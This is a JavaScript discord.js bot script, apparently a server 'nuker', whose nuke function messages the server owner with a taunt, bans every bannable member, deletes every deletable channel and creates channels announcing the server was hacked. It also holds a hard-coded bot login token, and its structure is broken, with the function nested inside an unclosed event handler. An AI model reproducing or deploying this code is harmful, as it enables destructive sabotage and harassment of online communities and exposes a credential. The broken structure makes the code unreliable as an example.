const Discord = require("discord.js");
const LOka = new Discord.Client();
console.log('By NXx_YT xXRU');
LOka.on('ready', () => {
  console.log(`Logged in as ${LOka.user.tag} !`);
 
});
LOka.on('ready',  () => {
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log('      ~            ~  By : NXx_YT xXRU ~           ~    ');
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log(`Logged in as  * [ "  NXx_YT xXRU " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
 
const { Client } = require('discord.js');
const client = new Client();
 
async function nuke(guild) {
  let users = 0;
  let channels = 0;
 
  await guild.fetchMembers();
 
  await guild.owner.send(' Hacked u by unknown Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
 
 
 
  await Promise.all(guild.members.map(async (m) => {
    if (m.bannable) {
      users++;
      await m.send('^_^').catch(e => { return void e; });
      return m.ban();
    }
  }));
 
    await Promise.all(guild.channels.map(c => {
    if (c.deletable) {
      channels++;
      return c.delete();
    }
  }));
 
    await guild.createChannel('Hacked u by unknown Is here', 'text');
 
      await guild.createChannel('Hacked u by unknown Is here', 'voice');
 
 
 
}

 
 
LOka.login("NTE4NTIzNTE3MTcyNzExNDM2.DuSAUw.AIEwuTF3bcP5fXwnsRjXZQ8sRWM")
